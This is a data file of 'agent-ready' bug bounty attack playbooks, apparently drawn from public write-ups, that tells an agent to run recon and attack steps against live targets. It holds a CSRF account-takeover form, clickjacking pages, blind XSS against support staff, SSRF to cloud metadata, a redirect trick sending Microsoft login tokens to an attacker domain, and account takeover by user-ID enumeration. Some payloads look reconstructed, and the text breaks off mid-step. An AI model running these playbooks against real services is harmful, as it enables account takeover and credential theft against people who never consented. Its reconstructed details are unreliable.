description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: Facebook Vulnerability – a "Cute Bug" that reveals the "likes" of deleted posts regardless of their privacy settings

trigger_conditions.when_to_apply: When an attacker can obtain a post ID and has a method to observe changes in the response to a specific URL pattern, particularly after a post has been deleted or its privacy settings modified.
prerequisites: Attacker must be able to obtain a valid post ID.
Attacker must have an authenticated Facebook account.
applicability_signals: The existence of the URL pattern: https://mbasic.facebook.com/<POST_ID>/likes/?&cancel_uri=https://mbasic.facebook.com
The ability to observe the likes of a post that the attacker is not supposed to see (e.g., by using a very low POST_ID).
skip_if: The API consistently returns a 'no results found' message for all post IDs, regardless of their status.
Facebook's infrastructure has been updated to uniformly remove likes from deleted posts immediately without any grace period.

recon_steps: Step 1: Navigate to https://mbasic.facebook.com/<POST_ID>/likes/?&cancel_uri=https://mbasic.facebook.com for various post IDs to understand the normal response for public, private, and non-existent posts.
Step 2: Attempt to access the likes of a post with a very low Post ID (e.g., 1) to identify if information disclosure is possible for posts with restrictive privacy settings or deleted posts.
attack_steps: Step 1: Obtain a target post ID that the attacker wants to monitor.
Step 2: Create a post with 'only me' privacy settings and have another test user attempt to view its likes using the /likes/ URL. Observe the response ('no results found').
Step 3: Delete the 'only me' post from the original account.
Step 4: From the other test user account, attempt to view the likes of the deleted post using the /likes/ URL. The attacker expects to see the likes of the deleted post.

Step 5: To automate this, set up a server to periodically (e.g., every 10-15 minutes) check the /likes/ URL for the target post ID. Log the likes if the response indicates the post is deleted but likes are still visible.
tools_recommended: Custom script (e.g., Python with requests library) to automate checking the /likes/ URL periodically.
Burp Suite to observe HTTP requests and responses.
success_indicators: Seeing a list of users who liked a post that has been deleted.
Seeing a list of users who liked a post that has been set to 'only me' or a limited audience, when accessed from an unauthorized account.
failure_indicators: Receiving a 'no results found' message when attempting to view likes of a deleted or private post: This indicates that the vulnerability has been patched or does not apply to this specific post.
Receiving a 'page not found' or similar error for the post ID itself: This means the post ID is invalid.

playbooks.impact: An attacker can discover users who interacted with (liked) a deleted post or a post with restricted privacy settings, even after the post is no longer visible or accessible to the general public. This could reveal sensitive information about user interactions with content they intended to keep private or remove.
playbooks.key_lesson: After a post is deleted or its privacy is restricted, always re-check the /likes/ endpoint with the post ID to see if the list of likers remains accessible, as there might be a delay or logic flaw in removing this associated data.

meta.title: Fiverr.com Full Accounts Takeover

trigger_conditions.when_to_apply: This technique is applicable when the target website allows users to update their profile information, specifically their email address, without proper CSRF protection on that action. It requires the user to be logged into their account in the same browser where the attacker can trick them into performing an action.
prerequisites: Victim must be logged into their Fiverr account in the same browser where the attack will be executed.
applicability_signals: Website allows email address updates in user profile settings.
No CSRF token is present or validated for the email update request.
skip_if: The email update functionality uses a valid and unique CSRF token for each request.
All requests to update profile information are denied with a 403 Forbidden status code when no valid session or token is present.

recon_steps: Step 1: Navigate to the user profile settings page on Fiverr.com and observe the process of changing the email address. Record the HTTP requests and parameters involved.
Step 2: Analyze the HTTP requests for the email update functionality to identify if a CSRF token is being used. Look for headers like 'X-CSRF-Token' or parameters named 'csrf_token'.
attack_steps: Step 1: Attacker crafts a malicious HTML page hosted on their own server. This page will contain a form that automatically submits an HTTP request to Fiverr.com.

Step 2: The form in the attacker's HTML page is configured to send a POST request to the email update endpoint on Fiverr.com. The 'email' parameter in this request will be set to the attacker's email address, and the 'victim_email_id' (or similar parameter representing the current email) should be the victim's email address (if such a parameter is used and required for validation).
Step 3: Attacker sends the link to this crafted HTML page to the victim.

Step 4: If the victim is logged into Fiverr.com in the same browser and clicks the link, their browser will automatically send the malicious request to Fiverr.com, changing their registered email to the attacker's email.
Step 5: Once the email is changed, the attacker can initiate a password reset for the victim's account using the new, attacker-controlled email address.
Step 6: The attacker receives the password reset email and uses it to reset the victim's password, gaining full account takeover.
payloads_or_patterns:
```html
<form action='https://www.fiverr.com/users/edit_profile/email' method='POST'>
  <input type='hidden' name='email' value='<ATTACKER_EMAIL>'>
  <input type='hidden' name='<PARAM_FOR_CURRENT_EMAIL>' value='<VICTIM_EMAIL>'>
  <input type='submit' value='Submit'>
</form>
<script>
  document.forms[0].submit();
</script>
```
tools_recommended: Burp Suite: To intercept and analyze the HTTP requests for email updates, and to craft and host the malicious HTML page.
A simple HTTP server (e.g., Python's http.server) to host the attacker's crafted HTML page.
success_indicators: Successful change of the victim's registered email address in their Fiverr profile.
Receipt of a password reset email at the attacker's email address for the victim's account.
Successful login to the victim's Fiverr account using the reset password.
failure_indicators: The email update request is blocked by a WAF or returns a 403 Forbidden status code.
The email update request fails with an error indicating an invalid CSRF token or missing parameter.
The victim receives no password reset email at the attacker's address after the profile update.

playbooks.impact: Full account takeover of victim's Fiverr account, allowing the attacker to change the account password, access sensitive information, make purchases, or alter existing services.
playbooks.key_lesson: Always implement and validate anti-CSRF tokens on all sensitive state-changing requests, especially those involving user profile modifications like email address updates.

meta.title: FirefoxOS Find My Device Service Clickjacking Bug results in Changing PINs, Wiping and Locking Phones!

target_profile.technology: Firefox OS Find My Device Service
tech_stack_fingerprints: X-Frame-Options header missing or not enforced

trigger_conditions.when_to_apply: When the 'Firefox Find My Device' service (find.firefox.com) does not implement X-Frame-Options or JavaScript frame-busting defenses, allowing it to be framed.
prerequisites: Attacker has a web page that can serve an iframe.
Victim is logged into the Firefox Find My Device service in the same browser.
The target service redirects to a device-specific URL when accessed.
applicability_signals: The find.firefox.com URL is responsive.
Navigating to https://find.firefox.com/ (when logged in) automatically redirects to a device-specific URL like https://find.firefox.com/<DEVICE_ID>.
skip_if: The X-Frame-Options header is set to DENY or SAMEORIGIN.
The website employs effective JavaScript frame-busting techniques that prevent the page from being loaded in an iframe.

recon_steps: Step 1: Navigate to https://find.firefox.com/ in a browser where you are logged into your Firefox account.
Step 2: Observe the URL after the redirection. Confirm it includes a unique Device ID (e.g., https://find.firefox.com/8fcXXXXc40de04b3803945XXXXXXXXXX).
attack_steps: Step 1: Craft an HTML page containing an iframe that points to the Firefox Find My Device service, e.g., '<iframe src="https://find.firefox.com/"></iframe>'.
Step 2: Embed the iframe within a malicious web page designed to trick the user into interacting with it (e.g., a fake giveaway or urgent message).
Step 3: Host the malicious web page and lure the victim to click on a link that directs them to this page.
Step 4: The victim, being logged into their Firefox account, will have the iframe automatically load the device-specific URL.

Step 5: Tricked by the UI of the malicious page, the victim will unknowingly click on buttons that correspond to actions on the framed Find My Device service (e.g., 'Erase device', 'Lock device', 'Change PIN').
payloads_or_patterns:
Click here to claim your prize!

You must click the button below to verify.
tools_recommended: Burp Suite: To inspect HTTP headers, particularly X-Frame-Options.
Any web server (e.g., Python SimpleHTTPServer) to host the malicious HTML page.
success_indicators: The victim's device is remotely locked, its data is erased, or its PIN is changed without their explicit intent to perform these actions on the Find My Device service.
Observing the framed content within the iframe on the attacker's page, even if it's just the device management interface showing device status.
failure_indicators: The browser displays 'Refused to connect' or similar error for the iframe, indicating X-Frame-Options is set to DENY or SAMEORIGIN.
The iframe loads but shows a JavaScript error preventing interaction or displays a message indicating the page cannot be displayed in a frame.
Victim reports no unexpected actions on their device after interacting with the malicious page.

playbooks.impact: An attacker can trick a logged-in user into remotely erasing, locking, or changing the PIN of their Firefox OS device through a clickjacking attack. This leads to loss of data and device control for the victim.
playbooks.key_lesson: Always implement robust X-Frame-Options headers and, where necessary, JavaScript frame-busting to prevent clickjacking vulnerabilities on sensitive web applications.

meta.title: Poisoning the Well – Compromising GoDaddy Customer Support With Blind XSS

affected_components: Customer profile fields (first name, last name)

trigger_conditions.when_to_apply: When user-controlled input, such as name fields, is stored by the application and later rendered in an administrative or support interface, and these fields are not properly sanitized.
prerequisites: Attacker must have an authenticated GoDaddy customer account.
applicability_signals: User-controlled input fields (e.g., first name, last name) appear to be reflected in internal/support tools without sufficient sanitization.
The application uses a system that renders user-provided data in different contexts (e.g., administrative panels, customer support interfaces).
skip_if: Input fields are strictly validated and sanitized, preventing script execution.
There is no observable mechanism for stored user data to be rendered in an administrative or support interface.

recon_steps: Step 1: Identify user-controlled input fields in the GoDaddy customer portal that are likely to be stored and displayed in other internal applications.
Step 2: Attempt to set these fields to simple HTML tags (e.g., `test`) and observe if they are rendered as HTML or as plain text in the user's profile or other accessible areas.
attack_steps: Step 1: In the GoDaddy customer account settings, set the 'First Name' field to a blind XSS payload pointing to a service like XSS Hunter.
Step 2: Set the 'Last Name' field to a similar blind XSS payload.
Step 3: Trigger the rendering of these fields by initiating a support call or by having a support agent view the customer's profile.
Step 4: Monitor the XSS Hunter dashboard for incoming callbacks, indicating the payload has fired in the support agent's browser.
tools_recommended: XSS Hunter: To host the blind XSS payload and capture callbacks.
success_indicators: Received a callback from XSS Hunter, indicating the payload executed in the browser of a GoDaddy customer support agent.
The DOM capture provided by XSS Hunter shows the injected script affecting the customer support interface, for example, breaking the JSON structure being displayed.
failure_indicators: No XSS Hunter callback received after triggering the profile view by a support agent. Possible causes: input sanitization, the specific data rendering context is not vulnerable, or the payload is blocked by a WAF. Pivot: Try different XSS payloads or different user-controlled fields.
Payload is reflected as plain text, indicating proper encoding or sanitization. Pivot: Look for other injection points or vulnerabilities.

playbooks.impact: An attacker could perform any action as the GoDaddy customer support representative, including modifying account information, transferring domain names, or deleting accounts. This leverages the high privileges of support agents.
playbooks.key_lesson: Always test user-controlled input fields for XSS, especially when that data is likely to be displayed in administrative or support interfaces, and use blind XSS techniques to detect vulnerabilities that don't manifest in the attacker's own browser.

meta.title: Facebook movies recommendation vulnerability – A bug capable of erasing all your important notifications!

tech_stack_fingerprints: Likely uses internal Facebook APIs for recommendations and notifications

trigger_conditions.when_to_apply: This technique is applicable when a user can send movie recommendations to another user and the system fails to properly manage the notification lifecycle after a response.
prerequisites: Attacker has an authenticated Facebook account.
Target user is a friend or can receive recommendations from the attacker.
applicability_signals: The ability to send a movie recommendation to another user.
The response to a movie recommendation allows selection and modification before sending.
skip_if: The system immediately marks a recommendation as resolved after the recipient responds, without any lingering requests.
There are rate limits or other measures preventing rapid, repeated actions by the same user.

recon_steps: Step 1: Identify the movie recommendation feature within Facebook and observe the normal notification flow for sending and receiving recommendations.
Step 2: Attempt to send a movie recommendation to a test account and analyze the request/response using browser developer tools or a proxy like Burp Suite.
attack_steps: Step 1: As User B, send a response to a movie recommendation request from User A, select a movie, and tamper with the request before sending it.
Step 2: Re-send the tampered request multiple times from User B's account.
Step 3: Observe User A's notification list for the overwhelming number of duplicate recommendation notifications.
payloads_or_patterns: Insufficient detail in writeup to provide specific payloads or patterns. The writeup mentions 'tamper the request' without specifying what to tamper with or how to resend it multiple times.
tools_recommended: Burp Suite: To intercept and analyze requests, and potentially automate the re-sending of tampered requests.
success_indicators: User A's notification list on Facebook is flooded with duplicate movie recommendation notifications, potentially pushing out other important alerts.
Facebook's backend logic appears to retain an unresolved recommendation request even after the recipient has responded.
failure_indicators: Notifications are handled correctly and do not duplicate upon response. -> The vulnerability is patched or not present.
User A's account is not affected by repeated notifications. -> The attack is not successful, possibly due to rate limiting or proper request de-duplication.

playbooks.impact: By repeatedly sending movie recommendations, an attacker can spam a victim's notification list, causing them to miss important notifications due to Facebook's limit of storing only the last 99 notifications. This effectively disrupts the victim's ability to stay informed about critical updates.
playbooks.key_lesson: When processing user-generated content that triggers notifications, ensure that the backend properly de-duplicates and resolves requests to prevent attackers from overwhelming users with unwanted alerts.

meta.title: WhatsApp Clickjacking Vulnerability – Yet another web client failure!

trigger_conditions.when_to_apply: This technique is applicable when a web application, such as a messaging client, does not implement robust iframe busting techniques or the X-FRAME-OPTIONS header, allowing an attacker to embed its interface within a malicious iframe.
prerequisites: User must be logged into their WhatsApp account in a separate tab or browser window.
applicability_signals: The target web application can be successfully embedded within an iframe on an attacker-controlled domain.
skip_if: The web application enforces the X-FRAME-OPTIONS: DENY or X-FRAME-OPTIONS: SAMEORIGIN header, preventing it from being loaded in an iframe.

recon_steps: Attempt to load the WhatsApp web client URL within an iframe on a test attacker-controlled website to check for X-Frame-Options restrictions.
Verify if the WhatsApp web client can be embedded without immediate browser restrictions.
attack_steps: Create an HTML page on an attacker-controlled domain.
Embed the WhatsApp web client URL within an iframe on this HTML page.

Craft UI elements on top of the iframe to trick the user into performing actions within the WhatsApp web client (e.g., clicking buttons for sending messages, creating groups, making calls, blocking contacts).
Share the malicious HTML page with the victim user.
Wait for the victim to visit the malicious page while logged into WhatsApp in another session.
tools_recommended: Burp Suite (for analyzing HTTP headers and response, crafting malicious HTML)
Custom HTML/JavaScript for creating the malicious landing page
success_indicators: The victim user inadvertently performs actions within their WhatsApp account (e.g., sending a message, adding a contact) after interacting with the attacker's crafted page.
The user's logged-in WhatsApp session executes commands dictated by the attacker's iframe and overlying UI elements.
failure_indicators: The browser displays a 'Refused to connect' error or the iframe remains blank, indicating the presence of X-Frame-Options: DENY or SAMEORIGIN. -> Pivot to other vulnerabilities.
The user is prompted for additional authentication or consent before actions are performed, indicating insufficient control. -> Re-evaluate the clickjacking scenario.

playbooks.impact: An attacker can send messages on behalf of the logged-in user, deceive users into creating unwanted chat groups, initiate calls, add or block contacts, effectively hijacking the user's session and actions within the WhatsApp web client.
playbooks.key_lesson: Always implement X-FRAME-OPTIONS: DENY or X-FRAME-OPTIONS: SAMEORIGIN headers to prevent clickjacking attacks on web applications, especially those handling sensitive user interactions.

meta.title: Official Telegram Web Client ClickJacking Vulnerability – When crypto is strong and client is weak

trigger_conditions.when_to_apply: When the target web application uses JavaScript frame busting techniques to prevent iframing and is vulnerable to resource blocking.
prerequisites: Attacker can MITM the local network or employ other methods to prevent access to `https://web.telegram.org/css/app.css`.
applicability_signals: Target web application does not set `X-Frame-Options` header.
Target web application attempts to prevent iframing using JavaScript frame busting.
Key CSS/styling resources can be blocked.
skip_if: Target web application correctly implements `X-Frame-Options: DENY` or `SAMEORIGIN`.
No mechanism exists to block critical resources required for rendering the application.

recon_steps: Step 1: Visit the Telegram Web Client and observe if it is framed within another page.
Step 2: Inspect the HTTP response headers for the `X-Frame-Options` header.
Step 3: Check the source code for JavaScript frame busting logic.
Step 4: Attempt to block the `https://web.telegram.org/css/app.css` resource using browser developer tools or a proxy to observe UI changes.
attack_steps: Step 1: Craft an HTML page that attempts to iframe the Telegram web client's settings page.
Step 2: Ensure the iframe is sandboxed (`<iframe sandbox>`) to allow script execution but prevent redirecting to the top window.
Step 3: Block access to `https://web.telegram.org/css/app.css` for the iframed page. This can be done via MITM, a malicious proxy, or potentially by exploiting other vulnerabilities.

Step 4: Trigger user interaction with the iframed page, such as clicking a seemingly innocuous button, which in reality performs an action on the Telegram web client due to the clickjacking vulnerability.
payloads_or_patterns:
<html><body><iframe src="https://web.telegram.org/#/settings" style="width:100%;height:100%;" sandbox></iframe></body></html>
(Note: Actual blocking of app.css needs to be implemented separately, e.g., via MITM or a custom proxy)
tools_recommended: Burp Suite or similar proxy: To intercept and modify network requests, specifically to block the `app.css` resource.
Browser Developer Tools: For inspecting HTML, CSS, and JavaScript, and for initial testing of resource blocking.
success_indicators: The Telegram settings page loads and is interactive within the iframe.

User actions within the iframe (e.g., clicking a button) result in changes to the user's Telegram account (e.g., sensitive information modified, messages sent) without the user being redirected to the main Telegram page.
The user's session on the main Telegram web client reflects the unauthorized actions.
failure_indicators: The Telegram web client does not load correctly in the iframe, or it attempts to break out of the iframe.
Blocking `app.css` does not enable interaction or bypasses frame busting.
No unintended actions are performed on the user's account after interaction.

playbooks.impact: An attacker can perform unauthorized actions on behalf of the logged-in user, including changing sensitive account information (password, recovery email), sending messages, sending contact requests, sending group invites, and marking all messages as read, effectively achieving full account control and potential for further social engineering or damage.
playbooks.key_lesson: Always implement server-side `X-Frame-Options` or `Content-Security-Policy` frame-ancestors directives to prevent clickjacking, as client-side JavaScript frame busting can often be bypassed.

meta.title: Facebook ClickJacking – How we put a new dress on Facebook UI

trigger_conditions.when_to_apply: When a Facebook endpoint that handles resource-related actions (like joining groups or interacting with pages) is identified as being iframable due to the absence of the 'X-Frame-Options' header.
prerequisites: The target user must be authenticated to Facebook.
The attacker must be able to trick the victim into interacting with a crafted malicious page.
applicability_signals: The endpoint /ajax/home/generic.php is accessible.
The response from the target endpoint does not contain an 'X-Frame-Options' header.
The target endpoint's functionality can be triggered via form submissions within an iframe.
skip_if: The target endpoint enforces 'X-Frame-Options' (e.g., 'DENY' or 'SAMEORIGIN').
The target endpoint's actions cannot be reliably triggered by form submissions within an iframe.

recon_steps: Step 1: Identify Facebook endpoints that handle resource interactions (e.g., group management, page actions).
Step 2: Test these endpoints for the presence of the 'X-Frame-Options' header in their HTTP responses. Use browser developer tools or a proxy like Burp Suite to inspect headers.
attack_steps: Step 1: Construct a malicious HTML page that includes an iframe pointing to the vulnerable Facebook endpoint (e.g., `https://www.facebook.com/ajax/home/generic.php?path=/groups/<GROUP_ID>/&endpoint=/ajax/home/generic.php&__user=<VICTIM_USER_ID>&...`).

Step 2: Within the malicious HTML, create an invisible form that is programmatically submitted to the iframe's content. This form should mimic the action the attacker wants the victim to perform (e.g., joining a group).

Step 3: Style the iframe and its container to be visually deceptive, overlaying the clickable elements of the legitimate Facebook UI that the attacker wants to trick the user into interacting with. For example, to make the victim click a 'Join Group' button, the attacker would position an iframe with a 'Join Group' form submission over that button.
Step 4: Trick the victim into visiting the attacker-controlled malicious HTML page. This can be done through phishing emails, social media messages, or other deceptive means.
tools_recommended: Burp Suite: To intercept and analyze HTTP requests/responses, identify vulnerable endpoints, and test for missing 'X-Frame-Options' headers.
HTML/JavaScript: To craft the malicious webpage for the clickjacking attack.
success_indicators: The victim performs the unintended action (e.g., joins a group, accepts a friend request) without explicitly confirming it on the Facebook UI.
The attacker's account is added as a member to the victim's secret group.
The attacker's account can perform actions on behalf of the victim as if the victim performed them.
failure_indicators: The iframe content is blocked from loading or displays a security warning (indicating 'X-Frame-Options' is enforced).
The intended action is not performed after the victim interacts with the deceptive element.
A 403 Forbidden response is received when attempting to load the target endpoint in an iframe.

playbooks.impact: An attacker can trick a victim into performing actions on Facebook without their full consent, such as joining private groups, adding unwanted friends, or liking pages, by leveraging the victim's authenticated session.
playbooks.key_lesson: Always verify that sensitive endpoints are protected by the 'X-Frame-Options' header or Content Security Policy to prevent clickjacking attacks.

meta.title: ESEA Server-Side Request Forgery and Querying AWS Meta Data

trigger_conditions.when_to_apply: The target application has a publicly accessible endpoint that processes a URL parameter to fetch and display external content, with insufficient validation on the URL or protocol.
prerequisites: The target application must be hosted on AWS infrastructure.
applicability_signals: Existence of an endpoint like `/global/media_preview.php?url=<URL>`.
The endpoint appears to fetch and render external content from the provided URL.
skip_if: The URL parameter is strictly validated against an allowlist of domains or protocols.
The application performs robust validation on file extensions or content types to prevent arbitrary file fetching.

recon_steps: Step 1: Perform Google dorking for site:play.esea.net ext:php to discover potential PHP endpoints.
Step 2: Identify endpoints that accept a URL parameter and appear to process external content (e.g., `media_preview.php?url=`).
Step 3: Test if the `url` parameter can fetch content from an attacker-controlled server (e.g., `http://attacker.com/test.png`) and check access logs.
attack_steps: Step 1: Attempt to bypass file extension restrictions by appending a query string to the URL (e.g., `https://play.esea.net/global/media_preview.php?url=http://attacker.com/file.png?.png`).
Step 2: If arbitrary file fetching is confirmed, attempt to query the AWS metadata endpoint by using `http://169.254.169.254/latest/meta-data/` as the URL parameter.
Step 3: If the AWS metadata endpoint is reachable, iterate through common metadata paths to extract sensitive information like IAM credentials or instance details.
tools_recommended: Burp Suite: To intercept and modify requests, and to log callbacks from controlled servers.
Google Dorks: For initial endpoint discovery.
success_indicators: The `media_preview.php` endpoint returns content from an external server.
The application successfully retrieves and displays metadata from `http://169.254.169.254/` (e.g., hostname, public keys, IAM roles).
failure_indicators: Requests to `http://169.254.169.254/` result in connection errors, timeouts, or unexpected responses (e.g., 403 Forbidden, HTML error pages). This may indicate the AWS metadata endpoint is blocked or the SSRF is restricted to specific protocols/domains.
If initial external URL fetching fails, check for more aggressive validation or filtering on the `url` parameter. Consider trying different file extensions or URL encoding tricks.

playbooks.impact: Gaining access to sensitive AWS instance metadata, including potentially IAM role credentials, which could lead to unauthorized access and control over AWS resources, data exfiltration, or further compromise of the AWS account.
playbooks.key_lesson: When encountering URL processing endpoints, always attempt to probe for Server-Side Request Forgery (SSRF) by targeting internal IP addresses, especially the AWS metadata endpoint (169.254.169.254), to uncover potential credential leaks or internal system information.

meta.title: Yahoo Login Protection Seal – Stored CSS Injection

affected_components: Account preferences for Login Protection Seal

trigger_conditions.when_to_apply: When a user can customize a 'protection seal' with text input and color selection, and the input is reflected unsanitized in CSS.
prerequisites: User must be authenticated to Yahoo.
applicability_signals: The presence of the 'protection seal' feature in account settings.
The 'prevBadgeColor' parameter accepts hex values during the seal preview or save process.
The user can input custom text for the seal.
skip_if: The 'prevBadgeColor' parameter only accepts predefined integer values.
All input fields for the seal are properly sanitized and do not allow CSS injection payloads.

recon_steps: Navigate to the Yahoo account preferences section.
Locate and access the 'Login Protection Seal' settings page.
Observe the request made when previewing or saving a protection seal.
attack_steps: Step 1: Send a POST request to `https://protect.login.yahoo.com/login/set_pref` with a valid session cookie.
Step 2: In the POST data, set `prevBadgeColor` to a malicious CSS payload ending with `}` followed by the desired CSS rules. For example: `prevBadgeColor=aaaaaa;}body{background:red;`
Step 3: Set `prevBadgeText[]` parameters with arbitrary strings to fulfill request requirements.
Step 4: Trigger the seal preview or save functionality.
Step 5: Observe if the injected CSS is rendered and affects the page where the seal is displayed.
tools_recommended: Burp Suite: Intercept and modify POST requests to `https://protect.login.yahoo.com/login/set_pref`.
success_indicators: The injected CSS rule (e.g., `body{background:red;}`) is applied to the page displaying the protection seal.
The page background color changes to the injected color.
failure_indicators: The injected CSS is not rendered, and the page appearance remains unchanged.
A WAF or input validation blocks the payload, returning a 403 Forbidden or a sanitized response. -> Try obfuscating CSS or using different CSS properties.

playbooks.impact: Stored CSS injection can be used to deface parts of the application visible to other users or to conduct certain types of phishing attacks by altering the visual appearance of legitimate pages. In older browsers (like IE6), CSS could sometimes be used to execute JavaScript, leading to Stored XSS.
playbooks.key_lesson: Always sanitize user-supplied input that is reflected in CSS styles or HTML attributes to prevent CSS injection and potential XSS.

meta.title: Obtaining Login Tokens for an Outlook, Office or Azure Account

trigger_conditions.when_to_apply: When a user is authenticated with Microsoft services and is redirected to a login endpoint that processes a 'wreply' parameter for subsequent redirection.
prerequisites: User must be logged into a Microsoft service (Outlook, Office, Azure).
Attacker must be able to trick the user into visiting a crafted URL.
applicability_signals: Observing redirection to login.microsoftonline.com/login.srf?wa=wsignin1.0&wreply=<URL>&id=<ID>
The 'wreply' parameter accepts URLs that do not immediately trigger a domain validation error.
skip_if: Microsoft's domain validation for the 'wreply' parameter is strict and does not allow for multi-layered decoding bypasses.
All requests to login endpoints return errors or redirects to known safe domains, even with various URL encoding techniques.

recon_steps: Step 1: Browse to outlook.office.com or another Microsoft service as a logged-in user and observe the redirection flow, specifically noting the parameters in the URL of login.microsoftonline.com/login.srf.
Step 2: Identify the 'wreply' parameter and its value. Attempt to change it to a non-Microsoft domain (e.g., attacker-controlled server) to see if it's accepted or rejected.
attack_steps: Step 1: Craft a URL that targets the Microsoft login service with the 'wreply' parameter set to a specially encoded URL pointing to the attacker's server, e.g., `https://login.microsoftonline.com/login.srf?wa=wsignin1.0&wreply=https%3a%2f%2f<attacker-controlled-domain>%2f&id=<ID>`.

Step 2: Specifically, use double URL encoding for the attacker's domain to bypass initial validation, e.g., `https://login.microsoftonline.com/login.srf?wa=wsignin1.0&wreply=https%3a%2f%2f<attacker-controlled-domain>%252f&id=<ID>`.

Step 3: Further craft the 'wreply' parameter to include valid Microsoft hostnames followed by the attacker's domain to exploit the URL parsing and validation logic, e.g., `https://login.microsoftonline.com/login.srf?wa=wsignin1.0&wreply=https%3a%2f%2foutlook.office.com%2540<attacker-controlled-domain>%2f&id=<ID>`.
Step 4: The user, upon visiting the crafted URL, will be redirected to a POST request containing a login token ('t') to the attacker's domain.
Step 5: Capture the POST request with the token on the attacker's server.
Step 6: Replay the captured token to the target Microsoft service (e.g., outlook.office.com) using a POST request to gain access to the user's account for that specific service.
payloads_or_patterns: <form name="fmHF" id="fmHF" action="https://outlook.office.com/owa/?wa=wsignin1.0" method="post"><input type="hidden" name="t" value="<LOGIN_TOKEN>"><input type="submit"></form>
tools_recommended: Burp Suite: To intercept and modify HTTP requests, especially the 'wreply' parameter.
A simple web server (e.g., Python http.server) to receive the POST request with the login token.
success_indicators: Receiving a POST request on the attacker-controlled server containing a 't' parameter with a valid-looking login token.
Successfully replaying the captured token to gain access to the target Microsoft service (e.g., viewing emails in Outlook).
failure_indicators: The 'wreply' parameter immediately redirects to an error page or a generic Microsoft login page, indicating strict domain validation.
The 't' parameter in the POST request is empty or malformed, indicating the token was not generated.
Replaying the token results in an invalid token error or an authentication failure.

playbooks.impact: Attacker can obtain login tokens for specific Microsoft services (e.g., Outlook, Office) and impersonate the authenticated user for that service, leading to unauthorized access to sensitive data and functionalities.
playbooks.key_lesson: Always validate the 'wreply' or similar redirect parameters in authentication flows using robust domain checking and disallow multiple levels of URL decoding bypasses.

meta.title: How I Could Compromise 4% (Locked) Instagram Accounts

affected_components: Update email address and verify account flow
Update phone number and verify account flow
tech_stack_fingerprints: HTML strings related to Instagram UI
Instagram user IDs are incremental numeric values

trigger_conditions.when_to_apply: This vulnerability is applicable to Instagram accounts that are in a 'locked' state, requiring verification, and where the verification process includes options to update email or phone number without prior authentication to access these update functions.
prerequisites: Target account must be in a 'locked' verification state.
Target account verification flow must expose an unauthenticated endpoint for updating sensitive information like email or phone number.
applicability_signals: Observing URLs like 'checkpoint_logged_out_main' that are accessible without authentication.
The presence of unique Instagram user IDs within these unauthenticated URLs.
The verification page offers options to 'Update email address & verify account' or 'Update phone number & verify account'.
skip_if: The verification page requires full authentication before allowing any profile information updates.
The verification options do not include 'Update email address' or 'Update phone number'.

recon_steps: Step 1: Identify target Instagram accounts that are in a 'locked' state requiring verification. This may require interacting with the platform to trigger this state or observing existing accounts in this state.
Step 2: Navigate to the verification URL for a locked account. Observe the URL structure and parameters. Look for the presence of the user ID and any indication of unauthenticated access.
attack_steps: Step 1: Identify a locked Instagram account and its associated user ID from the verification URL (e.g., checkpoint_logged_out_main).

Step 2: Attempt to access the 'Update email address & verify account' or 'Update phone number & verify account' functionality by directly navigating to the relevant URL associated with the target user ID, without prior authentication.
Step 3: If successful, change the email address or phone number associated with the account to one controlled by the attacker.
Step 4: Initiate a password reset flow using the newly provided email address or phone number to gain full account access.
payloads_or_patterns:
POST /verify_account_update HTTP/1.1
Host: instagram.com
Content-Type: application/x-www-form-urlencoded

user_id=<TARGET_USER_ID>&new_email=<ATTACKER_CONTROLLED_EMAIL>
tools_recommended: Burp Suite: Intercept and modify requests to the verification and update endpoints. Use Intruder for enumerating user IDs to find vulnerable accounts.
Custom script (e.g., Python): To automate the enumeration of user IDs and the testing of the update endpoints.
success_indicators: The verification page allows changing the email address or phone number associated with the account to attacker-controlled credentials without requiring prior authentication for this update step.
Receiving a password reset email or SMS at the attacker-controlled email address or phone number.
Successfully logging into the victim's account with the attacker-controlled password reset credentials.
failure_indicators: The 'Update email/phone' option is not present or disabled on the verification page.
Accessing the update functionality redirects to a login page or requires prior authentication.
The user ID is not found or the server returns an error indicating invalid account state.

playbooks.impact: Full account takeover of Instagram accounts that are temporarily locked due to inactivity or suspicious activity. This allows an attacker to gain access to user's private data, impersonate the user, and potentially exploit the account for further malicious purposes.
playbooks.key_lesson: Always verify that authentication is enforced on all endpoints, especially those that allow modification of sensitive user information like email addresses or phone numbers, even if they are part of a recovery or verification flow.

meta.title: Uber Bug Bounty: Turning Self-XSS into Good-XSS

trigger_conditions.when_to_apply: When a self-XSS vulnerability is found in a profile field that is only visible to the logged-in user, and the target uses a typical OAuth login flow without a state parameter in the callback.
prerequisites: Attacker has a registered account on the Uber Partners portal.
The target application uses an OAuth flow where the callback URL is predictable and lacks a `state` parameter.
The self-XSS payload can be injected into a profile field that is reflected in the HTML.
applicability_signals: Ability to inject `<script>alert(document.domain);</script>` into a profile field and see it execute in the browser's context.
Observation of the OAuth callback URL: `/oauth/callback?code=...` without a `state` parameter.
Presence of CSRF vulnerability in the logout function.
skip_if: The XSS payload is sanitized and not reflected in the HTML.
The OAuth callback properly implements the `state` parameter, preventing CSRF attacks.
No CSRF vulnerability is present in the logout functionality.

recon_steps: Step 1: Log into the Uber Partners portal and navigate to the profile editing section.
Step 2: Attempt to inject a simple XSS payload like `<script>alert(document.domain);</script>` into various profile fields (e.g., address, name).
Step 3: Observe if the JavaScript payload executes within the context of partners.uber.com.
Step 4: Inspect the OAuth login flow by initiating a login and observing the redirection URL to the callback endpoint.
Step 5: Verify if the OAuth callback URL, `/oauth/callback`, is missing the `state` parameter.
Step 6: Test the logout functionality for CSRF vulnerabilities by making a request to `/logout` and observing redirects.
attack_steps: Step 1: Craft an HTML page that leverages the identified vulnerabilities. This page will contain meta tags and image tags to trigger the necessary actions.

Step 2: Configure the Content Security Policy (CSP) meta tag to only allow requests to `https://partners.uber.com` and block requests to `https://login.uber.com`. This is done to prevent the session from being destroyed during the logout phase on the login domain.
Step 3: Embed an `` tag with the `src` attribute pointing to `https://partners.uber.com/logout/`. This will initiate the logout from the partners portal.
